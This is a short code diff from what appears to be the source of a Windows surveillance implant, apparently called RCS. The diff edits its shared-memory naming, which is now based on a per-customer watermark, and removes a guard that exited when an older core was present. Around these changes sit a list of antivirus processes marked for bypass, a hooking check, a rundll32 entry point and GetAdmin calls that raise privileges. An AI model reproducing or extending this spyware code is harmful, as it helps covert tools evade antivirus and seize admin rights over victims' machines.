@@ -23,13 +23,13 @@ WCHAR *process_bypassed[] = {L"avgscanx64.exe",
                              L"fsscoepl_x64.exe", 
 							 NULL };
 
-#define OLD_SHARE_MEMORY_READ_NAME "KB037H1"
+/*#define OLD_SHARE_MEMORY_READ_NAME "KB037H1"
 BOOL IsThereOldRCS()
 {
 	HANDLE hfile;
 	if (hfile = OpenFileMapping(FILE_MAP_READ, FALSE, OLD_SHARE_MEMORY_READ_NAME))
 		return TRUE;
-}
+}*/
 
 void SetGlobalVariables()
 {
@@ -55,14 +55,15 @@ void SetGlobalVariables()
 	// Recupera il PID del core
 	g_core_pid = GetParentPid(GetCurrentProcessId()); 
 
-	// Genera i nomi della shared memory in base alla chiave per-cliente
-	// XXX Verificare sempre che la chiave NON sia quella embeddata nel codice, maquella binary-patched
-	BYTE *temp_arr = (BYTE *)CLIENT_KEY;
+	// Genera i nomi della shared memory in base al watermark per-cliente
+	BYTE *temp_arr = (BYTE *)WATERMARK;
 	BYTE ckey_arr[16];
 	for (int j=0; j<16; j++)
 		ckey_arr[j] = temp_arr[j];
-	_snprintf_s(SHARE_MEMORY_READ_NAME, MAX_RAND_NAME, _TRUNCATE, "%s%02X%02X%02X%02X", SHARE_MEMORY_READ_BASENAME, ckey_arr[0], ckey_arr[1], ckey_arr[2], ckey_arr[3]);
-	_snprintf_s(SHARE_MEMORY_WRITE_NAME, MAX_RAND_NAME, _TRUNCATE, "%s%02X%02X%02X%02X", SHARE_MEMORY_WRITE_BASENAME, ckey_arr[0], ckey_arr[1], ckey_arr[2], ckey_arr[3]);
+	ckey_arr[8] = 0;
+	_snprintf_s(SHARE_MEMORY_READ_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ckey_arr);
+	ckey_arr[7] = 0;
+	_snprintf_s(SHARE_MEMORY_WRITE_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ckey_arr);
 
 	// Handle per verificare se un processo ha gia' la sharedmem (e' gia' hookato)
 	if (hfile = OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, SHARE_MEMORY_READ_NAME))
@@ -148,11 +149,6 @@ void StartPolling(void)
 // Funzione main eseguita da rundll32 64bit
 void __stdcall H64_sMain(void)
 {
-	// Se viene montata su un core "vecchio" (senza la nuova shared memory)
-	// allora esce per evitare problemi...
-	if (IsThereOldRCS())
-		ExitProcess(0);
-
 	SetGlobalVariables();
 	GetAdmin(GetCurrentProcessId());
 	GetAdmin(g_core_pid);
